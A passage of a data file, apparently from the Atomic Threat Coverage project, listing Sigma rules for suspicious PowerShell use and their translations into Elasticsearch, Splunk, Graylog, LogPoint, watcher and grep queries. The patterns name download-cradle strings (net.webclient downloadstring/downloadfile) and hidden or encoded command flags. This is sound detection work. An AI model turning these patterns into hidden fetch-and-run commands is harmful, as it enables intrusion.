system.net.webclient\\\\).downloadfile\\\\(* OR *new\\\\-object\\\\ net.webclient\\\\).downloadstring\\\\(* OR *new\\\\-object\\\\ net.webclient\\\\).downloadfile\\\\(*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/PowerShell-Download-from-URL <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"PowerShell Download from URL\",\\n    \"description\": \"Detects a Powershell process that contains download commands in its command line string\",\\n    \"tags\": [\\n      \"attack.t1086\",\\n      \"attack.execution\"\\n    ],\\n    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\powershell.exe AND CommandLine.keyword:(*new\\\\\\\\-object\\\\\\\\ system.net.webclient\\\\\\\\).downloadstring\\\\\\\\(* OR *new\\\\\\\\-object\\\\\\\\ system.net.webclient\\\\\\\\).downloadfile\\\\\\\\(* OR *new\\\\\\\\-object\\\\\\\\ net.webclient\\\\\\\\).downloadstring\\\\\\\\(* OR *new\\\\\\\\-object\\\\\\\\ net.webclient\\\\\\\\).downloadfile\\\\\\\\(*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\powershell.exe AND CommandLine.keyword:(*new\\\\\\\\-object\\\\\\\\ system.net.webclient\\\\\\\\).downloadstring\\\\\\\\(* OR *new\\\\\\\\-object\\\\\\\\ system.net.webclient\\\\\\\\).downloadfile\\\\\\\\(* OR *new\\\\\\\\-object\\\\\\\\ net.webclient\\\\\\\\).downloadstring\\\\\\\\(* OR *new\\\\\\\\-object\\\\\\\\ net.webclient\\\\\\\\).downloadfile\\\\\\\\(*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'PowerShell Download from URL\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:*\\\\\\\\powershell.exe AND CommandLine.keyword:(*new\\\\-object system.net.webclient\\\\).downloadstring\\\\(* *new\\\\-object system.net.webclient\\\\).downloadfile\\\\(* *new\\\\-object net.webclient\\\\).downloadstring\\\\(* *new\\\\-object net.webclient\\\\).downloadfile\\\\(*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\powershell.exe\" (CommandLine=\"*new-object system.net.webclient).downloadstring(*\" OR CommandLine=\"*new-object system.net.webclient).downloadfile(*\" OR CommandLine=\"*new-object net.webclient).downloadstring(*\" OR CommandLine=\"*new-object net.webclient).downloadfile(*\")) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"*\\\\\\\\powershell.exe\" CommandLine IN [\"*new-object system.net.webclient).downloadstring(*\", \"*new-object system.net.webclient).downloadfile(*\", \"*new-object net.webclient).downloadstring(*\", \"*new-object net.webclient).downloadfile(*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\powershell\\\\.exe)(?=.*(?:.*.*new-object system\\\\.net\\\\.webclient\\\\)\\\\.downloadstring\\\\(.*|.*.*new-object system\\\\.net\\\\.webclient\\\\)\\\\.downloadfile\\\\(.*|.*.*new-object net\\\\.webclient\\\\)\\\\.downloadstring\\\\(.*|.*.*new-object net\\\\.webclient\\\\)\\\\.downloadfile\\\\(.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Renamed Powershell.exe\nstatus: experimental\ndescription: Detects copying and renaming of powershell.exe before execution (RETEFE malware DOC/macro starting Sept 2018)\nreferences:\n    - https://attack.mitre.org/techniques/T1086/\n    - https://isc.sans.edu/forums/diary/Maldoc+Duplicating+PowerShell+Prior+to+Use/24254/\ntags:\n    - attack.t1086\n    - attack.execution\n    - car.2013-05-009\nauthor: Tom Ueltschi (@c_APT_ure)\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Description: Windows PowerShell\n    exclusion_1:\n        Image:\n            - '*\\powershell.exe'\n            - '*\\powershell_ise.exe'\n    exclusion_2:\n        Description: Windows PowerShell ISE\n    condition: all of selection and not (1 of exclusion_*)\nfalsepositives:\n    - penetration tests, red teaming\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Renamed Powershell.exe\nstatus: experimental\ndescription: Detects copying and renaming of powershell.exe before execution (RETEFE malware DOC/macro starting Sept 2018)\nreferences:\n    - https://attack.mitre.org/techniques/T1086/\n    - https://isc.sans.edu/forums/diary/Maldoc+Duplicating+PowerShell+Prior+to+Use/24254/\ntags:\n    - attack.t1086\n    - attack.execution\n    - car.2013-05-009\nauthor: Tom Ueltschi (@c_APT_ure)\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Description: Windows PowerShell\n    exclusion_1:\n        Image:\n            - '*\\powershell.exe'\n            - '*\\powershell_ise.exe'\n    exclusion_2:\n        Description: Windows PowerShell ISE\n    condition: all of selection and not (1 of exclusion_*)\nfalsepositives:\n    - penetration tests, red teaming\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Description:\"Windows\\\\ PowerShell\" AND (NOT ((Image.keyword:(*\\\\\\\\powershell.exe OR *\\\\\\\\powershell_ise.exe) OR Description:\"Windows\\\\ PowerShell\\\\ ISE\"))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Renamed-Powershell.exe <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Renamed Powershell.exe\",\\n    \"description\": \"Detects copying and renaming of powershell.exe before execution (RETEFE malware DOC/macro starting Sept 2018)\",\\n    \"tags\": [\\n      \"attack.t1086\",\\n      \"attack.execution\",\\n      \"car.2013-05-009\"\\n    ],\\n    \"query\": \"(Description:\\\\\"Windows\\\\\\\\ PowerShell\\\\\" AND (NOT ((Image.keyword:(*\\\\\\\\\\\\\\\\powershell.exe OR *\\\\\\\\\\\\\\\\powershell_ise.exe) OR Description:\\\\\"Windows\\\\\\\\ PowerShell\\\\\\\\ ISE\\\\\"))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Description:\\\\\"Windows\\\\\\\\ PowerShell\\\\\" AND (NOT ((Image.keyword:(*\\\\\\\\\\\\\\\\powershell.exe OR *\\\\\\\\\\\\\\\\powershell_ise.exe) OR Description:\\\\\"Windows\\\\\\\\ PowerShell\\\\\\\\ ISE\\\\\"))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Renamed Powershell.exe\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Description:\"Windows PowerShell\" AND NOT ((Image:(\"*\\\\\\\\powershell.exe\" \"*\\\\\\\\powershell_ise.exe\") OR Description:\"Windows PowerShell ISE\")))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Description=\"Windows PowerShell\" NOT (((Image=\"*\\\\\\\\powershell.exe\" OR Image=\"*\\\\\\\\powershell_ise.exe\") OR Description=\"Windows PowerShell ISE\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(Description=\"Windows PowerShell\"  -((Image IN [\"*\\\\\\\\powershell.exe\", \"*\\\\\\\\powershell_ise.exe\"] OR Description=\"Windows PowerShell ISE\")))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*Windows PowerShell)(?=.*(?!.*(?:.*(?:.*(?:.*(?:.*.*\\\\powershell\\\\.exe|.*.*\\\\powershell_ise\\\\.exe)|.*Windows PowerShell ISE))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious PowerShell Parameter Substring\nid: 36210e0d-5b19-485d-a087-c096088885f0\nstatus: experimental\ndescription: Detects suspicious PowerShell invocation with a parameter substring\nreferences:\n    - http://www.danielbohannon.com/blog-1/2017/3/12/powershell-execution-argument-obfuscation-how-it-can-make-detection-easier\ntags:\n    - attack.execution\n    - attack.t1086\nauthor: Florian Roth (rule), Daniel Bohannon (idea), Roberto Rodriguez (Fix)\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image:\n            - '*\\Powershell.exe'\n        CommandLine:\n            - ' -windowstyle h '\n            - ' -windowstyl h'\n            - ' -windowsty h'\n            - ' -windowst h'\n            - ' -windows h'\n            - ' -windo h'\n            - ' -wind h'\n            - ' -win h'\n            - ' -wi h'\n            - ' -win h '\n            - ' -win hi '\n            - ' -win hid '\n            - ' -win hidd '\n            - ' -win hidde '\n            - ' -NoPr '\n            - ' -NoPro '\n            - ' -NoProf '\n            - ' -NoProfi '\n            - ' -NoProfil '\n            - ' -nonin '\n            - ' -nonint '\n            - ' -noninte '\n            - ' -noninter '\n            - ' -nonintera '\n            - ' -noninterac '\n            - ' -noninteract '\n            - ' -noninteracti '\n            - ' -noninteractiv '\n            - ' -ec '\n            - ' -encodedComman '\n            - ' -encodedComma '\n            - ' -encodedComm '\n            - ' -encodedCom '\n            - ' -encodedCo '\n            - ' -encodedC '\n            - ' -encoded '\n            - ' -encode '\n            - ' -encod '\n            - ' -enco '\n            - ' -en '\n    condition: selection\nfalsepositives:\n    - Penetration tests\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious PowerShell Parameter Substring\nid: 36210e0d-5b19-485d-a087-c096088885f0\nstatus: experimental\ndescription: Detects suspicious PowerShell invocation with a parameter substring\nreferences:\n    - http://www.danielbohannon.com/blog-1/2017/3/12/powershell-execution-argument-obfuscation-how-it-can-make-detection-easier\ntags:\n    - attack.execution\n    - attack.t1086\nauthor: Florian Roth (rule), Daniel Bohannon (idea), Roberto Rodriguez (Fix)\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image:\n            - '*\\Powershell.exe'\n        CommandLine:\n            - ' -windowstyle h '\n            - ' -windowstyl h'\n            - ' -windowsty h'\n            - ' -windowst h'\n            - ' -windows h'\n            - ' -windo h'\n            - ' -wind h'\n            - ' -win h'\n            - ' -wi h'\n            - ' -win h '\n            - ' -win hi '\n            - ' -win hid '\n            - ' -win hidd '\n            - ' -win hidde '\n            - ' -NoPr '\n            - ' -NoPro '\n            - ' -NoProf '\n            - ' -NoProfi '\n            - ' -NoProfil '\n            - ' -nonin '\n            - ' -nonint '\n            - ' -noninte '\n            - ' -noninter '\n            - ' -nonintera '\n            - ' -noninterac '\n            - ' -noninteract '\n            - ' -noninteracti '\n            - ' -noninteractiv '\n            - ' -ec '\n            - ' -encodedComman '\n            - ' -encodedComma '\n            - ' -encodedComm '\n            - ' -encodedCom '\n            - ' -encodedCo '\n            - ' -encodedC '\n            - ' -encoded '\n            - ' -encode '\n            - ' -encod '\n            - ' -enco '\n            - ' -en '\n    condition: selection\nfalsepositives:\n    - Penetration tests\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:(*\\\\\\\\Powershell.exe) AND CommandLine:(\"\\\\ \\\\-windowstyle\\\\ h\\\\ \" OR \"\\\\ \\\\-windowstyl\\\\ h\" OR \"\\\\ \\\\-windowsty\\\\ h\" OR \"\\\\ \\\\-windowst\\\\ h\" OR \"\\\\ \\\\-windows\\\\ h\" OR \"\\\\ \\\\-windo\\\\ h\" OR \"\\\\ \\\\-wind\\\\ h\" OR \"\\\\ \\\\-win\\\\ h\" OR \"\\\\ \\\\-wi\\\\ h\" OR \"\\\\ \\\\-win\\\\ h\\\\ \" OR \"\\\\ \\\\-win\\\\ hi\\\\ \" OR \"\\\\ \\\\-win\\\\ hid\\\\ \" OR \"\\\\ \\\\-win\\\\ hidd\\\\ \" OR \"\\\\ \\\\-win\\\\ hidde\\\\ \" OR \"\\\\ \\\\-NoPr\\\\ \" OR \"\\\\ \\\\-NoPro\\\\ \" OR \"\\\\ \\\\-NoProf\\\\ \" OR \"\\\\ \\\\-NoProfi\\\\ \" OR \"\\\\ \\\\-NoProfil\\\\ \" OR \"\\\\ \\\\-nonin\\\\ \" OR \"\\\\ \\\\-nonint\\\\ \" OR \"\\\\ \\\\-noninte\\\\ \" OR \"\\\\ \\\\-noninter\\\\ \" OR \"\\\\ \\\\-nonintera\\\\ \" OR \"\\\\ \\\\-noninterac\\\\ \" OR \"\\\\ \\\\-noninteract\\\\ \" OR \"\\\\ \\\\-noninteracti\\\\ \" OR \"\\\\ \\\\-noninteractiv\\\\ \" OR \"\\\\ \\\\-ec\\\\ \" OR \"\\\\ \\\\-encodedComman\\\\ \" OR \"\\\\ \\\\-encodedComma\\\\ \" OR \"\\\\ \\\\-encodedComm\\\\ \" OR \"\\\\ \\\\-encodedCom\\\\ \" OR \"\\\\ \\\\-encodedCo\\\\ \" OR \"\\\\ \\\\-encodedC\\\\ \" OR \"\\\\ \\\\-encoded\\\\ \" OR \"\\\\ \\\\-encode\\\\ \" OR \"\\\\ \\\\-encod\\\\ \" OR \"\\\\ \\\\-enco\\\\ \" OR \"\\\\ \\\\-en\\\\ \"))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-PowerShell-Parameter-Substring <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious PowerShell Parameter Substring\",\\n    \"description\": \"Detects suspicious PowerShell invocation with a parameter substring\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1086\"\\n    ],\\n    \"query\": \"(Image.keyword:(*\\\\\\\\\\\\\\\\Powershell.exe) AND CommandLine:(\\\\\"\\\\\\\\ \\\\\\\\-windowstyle\\\\\\\\ h\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-windowstyl\\\\\\\\ h\\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-windowsty\\\\\\\\ h\\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-windowst\\\\\\\\ h\\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-windows\\\\\\\\ h\\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-windo\\\\\\\\ h\\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-wind\\\\\\\\ h\\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-win\\\\\\\\ h\\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-wi\\\\\\\\ h\\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-win\\\\\\\\ h\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-win\\\\\\\\ hi\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-win\\\\\\\\ hid\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-win\\\\\\\\ hidd\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-win\\\\\\\\ hidde\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-NoPr\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-NoPro\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-NoProf\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-NoProfi\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-NoProfil\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-nonin\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-nonint\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-noninte\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-noninter\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-nonintera\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-noninterac\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-noninteract\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-noninteracti\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-noninteractiv\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-ec\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-encodedComman\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-encodedComma\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-encodedComm\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-encodedCom\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-encodedCo\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-encodedC\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-encoded\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-encode\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-encod\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-enco\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-en\\\\\\\\ \\\\\"))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:(*\\\\\\\\\\\\\\\\Powershell.exe) AND CommandLine:(\\\\\"\\\\\\\\ \\\\\\\\-windowstyle\\\\\\\\ h\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-windowstyl\\\\\\\\ h\\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-windowsty\\\\\\\\ h\\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-windowst\\\\\\\\ h\\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-windows\\\\\\\\ h\\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-windo\\\\\\\\ h\\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-wind\\\\\\\\ h\\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-win\\\\\\\\ h\\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-wi\\\\\\\\ h\\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-win\\\\\\\\ h\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-win\\\\\\\\ hi\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-win\\\\\\\\ hid\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-win\\\\\\\\ hidd\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-win\\\\\\\\ hidde\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-NoPr\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-NoPro\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-NoProf\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-NoProfi\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-NoProfil\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-nonin\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-nonint\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-noninte\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-noninter\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-nonintera\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-noninterac\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-noninteract\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-noninteracti\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-noninteractiv\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-ec\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-encodedComman\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-encodedComma\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-encodedComm\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-encodedCom\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-encodedCo\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-encodedC\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-encoded\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-encode\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-encod\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-enco\\\\\\\\ \\\\\" OR \\\\\"\\\\\\\\ \\\\\\\\-en\\\\\\\\ \\\\\"))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious PowerShell Parameter Substring\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:(*\\\\\\\\Powershell.exe) AND CommandLine:(\" \\\\-windowstyle h \" \" \\\\-windowstyl h\" \" \\\\-windowsty h\" \" \\\\-windowst h\" \" \\\\-windows h\" \" \\\\-windo h\" \" \\\\-wind h\" \" \\\\-win h\" \" \\\\-wi h\" \" \\\\-win h \" \" \\\\-win hi \" \" \\\\-win hid \" \" \\\\-win hidd \" \" \\\\-win hidde \" \" \\\\-NoPr \" \" \\\\-NoPro \" \" \\\\-NoProf \" \" \\\\-NoProfi \" \" \\\\-NoProfil \" \" \\\\-nonin \" \" \\\\-nonint \" \" \\\\-noninte \" \" \\\\-noninter \" \" \\\\-nonintera \" \" \\\\-noninterac \" \" \\\\-noninteract \" \" \\\\-noninteracti \" \" \\\\-noninteractiv \" \" \\\\-ec \" \" \\\\-encodedComman \" \" \\\\-encodedComma \" \" \\\\-encodedComm \" \" \\\\-encodedCom \" \" \\\\-encodedCo \" \" \\\\-encodedC \" \" \\\\-encoded \" \" \\\\-encode \" \" \\\\-encod \" \" \\\\-enco \" \" \\\\-en \"))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Image=\"*\\\\\\\\Powershell.exe\") (CommandLine=\" -windowstyle h \" OR CommandLine=\" -windowstyl h\" OR CommandLine=\" -windowsty h\" OR CommandLine=\" -windowst h\" OR CommandLine=\" -windows h\" OR CommandLine=\" -windo h\" OR CommandLine=\" -wind h\" OR CommandLine=\" -win h\" OR CommandLine=\" -wi h\" OR CommandLine=\" -win h \" OR CommandLine=\" -win hi \" OR CommandLine=\" -win hid \" OR CommandLine=\" -win hidd \" OR CommandLine=\" -win hidde \" OR CommandLine=\" -NoPr \" OR CommandLine=\" -NoPro \" OR CommandLine=\" -NoProf \" OR CommandLine=\" -NoProfi \" OR CommandLine=\" -NoProfil \" OR CommandLine=\" -nonin \" OR CommandLine=\" -nonint \" OR CommandLine=\" -noninte \" OR CommandLine=\" -noninter \" OR CommandLine=\" -nonintera \" OR CommandLine=\" -noninterac \" OR CommandLine=\" -noninteract \" OR CommandLine=\" -noninteracti \" OR CommandLine=\" -noninteractiv \" OR CommandLine=\" -ec \" OR CommandLine=\" -encodedComman \" OR CommandLine=\" -encodedComma \" OR CommandLine=\" -encodedComm \" OR CommandLine=\" -encodedCom \" OR CommandLine=\" -encodedCo \" OR CommandLine=\" -encodedC \" OR CommandLine=\" -encoded \" OR CommandLine=\" -encode \" OR CommandLine=\" -encod \" OR CommandLine=\" -enco \" OR CommandLine=\" -en \"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image IN [\"*\\\\\\\\Powershell.exe\"] CommandLine IN [\" -windowstyle h \", \" -windowstyl h\", \" -windowsty h\", \" -windowst h\", \" -windows h\", \" -windo h\", \" -wind h\", \" -win h\", \" -wi h\", \" -win h \", \" -win hi \", \" -win hid \", \" -win hidd \", \" -win hidde \", \" -NoPr \", \" -NoPro \", \" -NoProf \", \" -NoProfi \", \" -NoProfil \", \" -nonin \", \" -nonint \", \" -noninte \", \" -noninter \", \" -nonintera \", \" -noninterac \", \" -noninteract \", \" -noninteracti \", \" -noninteractiv \", \" -ec \", \" -encodedComman \", \" -encodedComma \", \" -encodedComm \", \" -encodedCom \", \" -encodedCo \", \" -encodedC \", \" -encoded \", \" -encode \", \" -encod \", \" -enco \", \" -en \"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*.*\\\\Powershell\\\\.exe))(?=.*(?:.* -windowstyle h |.* -windowstyl h|.* -windowsty h|.* -windowst h|.* -windows h|.* -windo h|.* -wind h|.* -win h|.* -wi h|.* -win h |.* -win hi |.* -win hid |.* -win hidd |.* -win hidde |.* -NoPr |.* -NoPro |.* -NoProf |.* -NoProfi |.* -NoProfil |.* -nonin |.* -nonint |.* -noninte |.* -noninter |.* -nonintera |.* -noninterac |.* -noninteract |.* -noninteracti |.* -noninteractiv |.* -ec |.* -encodedComman |.* -encodedComma |.* -encodedComm |.* -encodedCom |.* -encodedCo |.* -encodedC |.* -encoded |.* -encode |.* -encod |.* -enco |.* -en )))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious XOR Encoded PowerShell Command Line\nid: bb780e0c-16cf-4383-8383-1e5471db6cf9\ndescription: Detects suspicious powershell process which includes bxor command, alternatvide obfuscation method to b64 encoded commands.\nstatus: experimental\nauthor: Sami Ruohonen\ndate: 2018/09/05\ntags:\n    - attack.execution\n    - attack.t1086\ndetection:\n    selection:\n        CommandLine:\n            - '* -bxor*'\n    condition: selection\nfalsepositives:\n    - unknown\nlevel: medium\nlogsource:\n    category: process_creation\n    product: windows", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious XOR Encoded PowerShell Command Line\nid: bb780e0c-16cf-4383-8383-1e5471db6cf9\ndescription: Detects suspicious powershell process which includes bxor command, alternatvide obfuscation method to b64 encoded commands.\nstatus: experimental\nauthor: Sami Ruohonen\ndate: 2018/09/05\ntags:\n    